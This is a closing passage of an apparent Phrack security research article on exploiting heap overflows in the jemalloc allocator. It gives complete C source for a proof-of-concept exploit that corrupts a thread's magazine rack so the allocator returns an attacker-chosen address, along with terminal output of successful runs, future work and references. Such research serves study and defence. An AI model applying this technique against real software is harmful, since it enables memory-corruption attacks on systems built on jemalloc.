+
+The vulnerable code spawns a, so called, vulnerable thread that performs an
+allocation of 256 bytes. A user supplied buffer, 'argv[2]' is copied in it
+thus causing a heap overflow. A set of victim threads are then created. For
+demonstration purposes, victim threads have a very limited lifetime, their
+main purpose is to force jemalloc initialize new 'mag_rack_t' structures.
+As the comments indicate, the allocations stored in 'p1' variables take
+place before the magazine rack is overflown while the ones stored in 'p2'
+will get affected by the fake magazine rack (in fact, only one of them
+will; the one serviced by the overflown rack). The allocations performed
+by victim threads are serviced by the newly initialized magazine racks.
+Since each magazine rack spans 256 bytes, it is highly possible that the
+overflown region allocated by the vulnerable thread will lie somewhere
+around one of them (this requires that both the target magazine rack and
+the overflown region will be serviced by the same arena).
+
+Once the attacker is able to corrupt a magazine rack, exploitation is just
+a matter of overwriting the appropriate 'bin_mags' entry. The entry should
+be corrupted in such a way that 'curmag' should point to a fake 'mag_t'
+structure. The attacker can choose to either use a large 'nrounds' value to
+pivot into the stack, or give arbitrary addresses as members of the void
+pointer array, preferably the latter. The exploitation code given below
+makes use of the void pointer technique (file exploit-mag.c):
+
+
+int main(int argc, char *argv[]) {
+  char fake_mag_t[12 + 1];
+  char buff[1024 + 1];
+  size_t i, fake_mag_t_p;
+
+  if(argc != 2) {
+    printf("%s <mag_t address>\n", argv[0]);
+    return 1;
+  }
+  fake_mag_t_p = (size_t)strtoul(argv[1], NULL, 16);
+
+  /* Please read this...
+   *
+   * In order to void using NULL bytes, we use 0xffffffff as the value
+   * for 'nrounds'. This will force jemalloc picking up 0x42424242 as
+   * a valid region pointer instead of 0x41414141 :)
+   */
+  printf("[*] Assuming fake mag_t is at %p\n", (void *)fake_mag_t_p);
+  *(size_t *)&fake_mag_t[0] = 0x42424242;
+  *(size_t *)&fake_mag_t[4] = 0xffffffff;
+  *(size_t *)&fake_mag_t[8] = 0x41414141;
+  fake_mag_t[12] = 0;
+  setenv("FAKE_MAG_T", fake_mag_t, 1);
+
+  /* The buffer that will overwrite the victim 'mag_rack_t'. */
+  printf("[*] Preparing input buffer\n");
+  for(i = 0; i < 256; i++)
+    *(size_t *)&buff[4 * i] = (size_t)fake_mag_t_p;
+  buff[1024] = 0;
+
+  printf("[*] Executing the vulnerable program\n");
+  execl("./vuln-mag", "./vuln-mag", "16", buff, NULL);
+  perror("execl");
+  return 0;
+}
+
+
+Let's compile and run the exploit code:
+
+
+$ ./exploit-mag
+./exploit-mag <mag_t address>
+$ ./exploit-mag 0xdeadbeef
+[*] Assuming fake mag_t is at 0xdeadbeef
+[*] Preparing input buffer
+[*] Executing the vulnerable program
+[*] 0xbfbfedd6
+...
+
+
+The vulnerable code reports that the environment variable 'FAKE_MAG_T'
+containing our fake 'mag_t' structure is exported at 0xbfbfedd6.
+
+
+$ ./exploit-mag 0xbfbfedd6
+[*] Assuming fake mag_t is at 0xbfbfedd6
+[*] Preparing input buffer
+[*] Executing the vulnerable program
+[*] 0xbfbfedd6
+[vuln] v = 0x28311100
+[673283456] p1 = 0x28317800
+...
+[673283456] p2 = 0x42424242
+[673282496] p2 = 0x3d545f47
+
+
+Neat. One of the victim threads, the one whose magazine rack is overflown,
+returns an arbitrary address as a valid region. Overwriting the thread
+caches is probably the most lethal attack but it suffers from a limitation
+which we do not consider serious. The fact that the returned memory region
+and the 'bin_mags[]' element both receive arbitrary addresses, results in a
+segfault either on the deallocation of 'p2' or once the thread dies by
+explicitly or implicitly calling 'pthread_exit()'. Possible shellcodes
+should be triggered _before_ the thread exits or the memory region is
+freed. Fair enough... :)
+
+
+--[ 4 - A real vulnerability
+
+For a detailed case study on jemalloc heap overflows see the second Art of
+Exploitation paper in this issue of Phrack.
+
+
+--[ 5 - Future work
+
+This paper is the first public treatment of jemalloc that we are aware
+of. In the near future, we are planning to research how one can corrupt
+the various red black trees used by jemalloc for housekeeping. The rbtree
+implementation (defined in rb.h) is fully based on preprocessor macros
+and it's quite complex in nature. Although we have already debugged them,
+due to lack of time we didn't attempt to exploit the various tree
+operations performed on rbtrees. We wish that someone will continue our
+work from where we left of. If no one does, then you definitely know whose
+articles you'll soon be reading :)
+
+
+--[ 6 - Conclusion
+
+We have done the first step in analyzing jemalloc. We do know, however,
+that we have not covered every possible potential of corrupting the
+allocator in a controllable way. We hope to have helped those that were
+about to study the FreeBSD userspace allocator or the internals of Firefox
+but wanted to have a first insight before doing so. Any reader that
+discovers mistakes in our article is advised to contact us as soon as
+possible and let us know.
+
+Many thanks to the Phrack staff for their comments. Also, thanks to George
+Argyros for reviewing this work and making insightful suggestions.
+
+Finally, we would like to express our respect to Jason Evans for such a
+leet allocator. No, that isn't ironic; jemalloc is, in our opinion, one of
+the best (if not the best) allocators out there.
+
+
+--[ 7 - References
+
+[JESA]  Standalone jemalloc
+        - http://www.canonware.com/cgi-bin/gitweb.cgi?p=jemalloc.git
+
+[JEMF]  Mozilla Firefox jemalloc
+        - http://hg.mozilla.org/mozilla-central/file/tip/memory/jemalloc
+
+[JEFB]  FreeBSD 8.2-RELEASE-i386 jemalloc
+        - http://www.freebsd.org/cgi/cvsweb.cgi/src/lib/libc/stdlib/
+            malloc.c?rev=1.183.2.5.4.1;content-type=text%2Fplain;
+            only_with_tag=RELENG_8_2_0_RELEASE
+
+[JELX]  Linux port of the FreeBSD jemalloc
+        - http://www.canonware.com/download/jemalloc/
+            jemalloc_linux_20080828a.tbz
+
+[JE06]  Jason Evans, A Scalable Concurrent malloc(3) Implementation for
+            FreeBSD
+        - http://people.freebsd.org/~jasone/jemalloc/bsdcan2006
+            /jemalloc.pdf
+
+[PV10]  Peter Vreugdenhil, Pwn2Own 2010 Windows 7 Internet Explorer 8
+            exploit
+        - http://vreugdenhilresearch.nl
+            /Pwn2Own-2010-Windows7-InternetExplorer8.pdf
+
+[FENG]  Alexander Sotirov, Heap Feng Shui in Javascript
+        - http://www.phreedom.org/research/heap-feng-shui/
+            heap-feng-shui.html
+
+[HOEJ]  Mark Daniel, Jake Honoroff, Charlie Miller, Engineering Heap
+            Overflow Exploits with Javascript
+        - http://securityevaluators.com/files/papers/isewoot08.pdf
+
+[CVRS]  Chris Valasek, Ryan Smith, Exploitation in the Modern Era
+            (Blueprint)
+        - https://www.blackhat.com/html/bh-eu-11/
+            bh-eu-11-briefings.html#Valasek
+
+[VPTR]  rix, Smashing C++ VPTRs
+        - https://phrack.org/issues/56/8.html#article
+
+[HAPF]  huku, argp, Patras Heap Massacre
+        - http://fosscomm.ceid.upatras.gr/
+
+[APHN]  argp, FreeBSD Kernel Massacre
+        - http://ph-neutral.darklab.org/previous/0x7db/talks.html
+
+[UJEM]  unmask_jemalloc
+        - https://github.com/argp/unmask_jemalloc
+
+
+--[ 8 - Code
+
+--[ EOF
